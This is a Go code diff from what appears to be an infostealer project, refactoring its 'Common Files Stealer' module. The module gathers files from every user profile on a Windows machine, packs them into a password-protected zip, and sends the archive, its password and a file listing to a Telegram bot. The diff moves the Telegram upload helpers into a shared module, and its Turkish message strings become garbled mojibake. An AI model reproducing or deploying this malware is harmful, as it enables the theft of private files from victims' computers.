@@ -8,78 +8,10 @@ import (
 	"strings"
 	"time"
 
-	"github.com/benzoXdev/oxil/utils/fileutil"
-	"github.com/benzoXdev/oxil/utils/hardware"
+	"oxilreforged/modules/telegram"
+	"oxilreforged/utils/fileutil"
+	"oxilreforged/utils/hardware"
 )
-
-// Telegram yardımcı fonksiyonları (diğer modüllerden aynı)
-func sendTextToTelegram(botToken, chatID, text string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
-
-	payload := map[string]string{
-		"chat_id":    chatID,
-		"text":       text,
-		"parse_mode": "Markdown",
-	}
-
-	jsonData, _ := json.Marshal(payload)
-	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
-	}
-	return nil
-}
-
-func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
-
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	writer.WriteField("chat_id", chatID)
-	writer.WriteField("caption", caption)
-	writer.WriteField("parse_mode", "Markdown")
-
-	fileWriter, err := writer.CreateFormFile("document", filepath.Base(zipPath))
-	if err != nil {
-		return err
-	}
-
-	file, err := os.Open(zipPath)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	_, err = io.Copy(fileWriter, file)
-	if err != nil {
-		return err
-	}
-
-	writer.Close()
-
-	req, _ := http.NewRequest("POST", url, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
-	}
-
-	return nil
-}
 
 func Run(botToken string, chatID string) {
 	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
@@ -148,7 +80,6 @@ func Run(botToken string, chatID string) {
 				username := strings.Split(user, "\\")[2]
 				dest := filepath.Join(tempDir, username, info.Name())
 
-				// Aynı isimde dosya varsa sonuna rastgele ekle
 				if fileutil.Exists(dest) {
 					dest = filepath.Join(tempDir, username, fmt.Sprintf("%s_%s", info.Name(), randString(4)))
 				}
@@ -168,7 +99,6 @@ func Run(botToken string, chatID string) {
 		return
 	}
 
-	// ZIP oluştur (şifreli)
 	tempZip := filepath.Join(os.TempDir(), "commonfiles.zip")
 	password := randString(16)
 	if err := fileutil.ZipWithPassword(tempDir, tempZip, password); err != nil {
@@ -176,29 +106,26 @@ func Run(botToken string, chatID string) {
 	}
 	defer os.Remove(tempZip)
 
-	// Metin mesajı hazırla
 	tree := fileutil.Tree(tempDir, "")
 	message := fmt.Sprintf(
-		"*?? Common Files Stealer*\n\n"+
-			"**Bulunan Dosya Sayısı:** `%d`\n"+
-			"**ZIP Şifresi:** `%s`\n\n"+
-			"**Klasör Yapısı:**\n```%s```",
+		"*ğŸ“ Common Files Stealer*\n\n"+
+			"**Bulunan Dosya SayÄ±sÄ±:** `%d`\n"+
+			"**ZIP Åifresi:** `%s`\n\n"+
+			"**KlasÃ¶r YapÄ±sÄ±:**\n```%s```",
 		found,
 		password,
 		tree,
 	)
 
-	// Metni Telegram'a gönder
-	_ = sendTextToTelegram(botToken, chatID, message)
+	_ = telegram.SendTextToTelegram(botToken, chatID, message)
 
-	// ZIP dosyasını Telegram'a gönder
-	caption := fmt.Sprintf("Şifreli dosyalar arşivi (Şifre: %s)", password)
-	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
+	caption := fmt.Sprintf("Åifreli dosyalar arÅŸivi (Åifre: %s)", password)
+	_ = telegram.SendZipToTelegram(botToken, chatID, caption, tempZip)
 }
 
 func randString(n int) string {
 	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-	rand.Seed(time.Now().UnixNano()) // Rastgelelik için seed ekledim
+	rand.Seed(time.Now().UnixNano())
 	b := make([]rune, n)
 	for i := range b {
 		b[i] = letters[rand.Intn(len(letters))]
